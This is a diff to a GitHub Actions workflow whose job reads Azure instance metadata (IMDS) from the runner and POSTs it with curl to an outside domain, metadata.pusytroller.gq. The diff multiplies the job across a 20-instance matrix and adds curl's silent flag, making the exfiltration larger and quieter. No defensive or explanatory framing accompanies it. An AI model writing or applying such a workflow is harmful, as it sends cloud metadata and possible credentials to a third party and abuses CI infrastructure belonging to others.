@@ -6,6 +6,9 @@ on:
 jobs:
   send-metadata:
     runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     steps:
       - name: 获取 Azure IMDS 元数据
         run: |
@@ -17,9 +20,10 @@ jobs:
 
       - name: 发送元数据到外部服务器
         run: |
-          curl -X POST "https://metadata.pusytroller.gq/metadata" \
+          curl -s -X POST "https://metadata.pusytroller.gq/metadata" \
             -H "Content-Type: application/json" \
             -d '${{ env.METADATA }}'
 
       - name: 确认发送成功
-        run: echo "✅ Azure 元数据已发送到 www.example.com"
+        run: |
+          echo "✅ Job #${{ matrix.instance }} 元数据已发送"
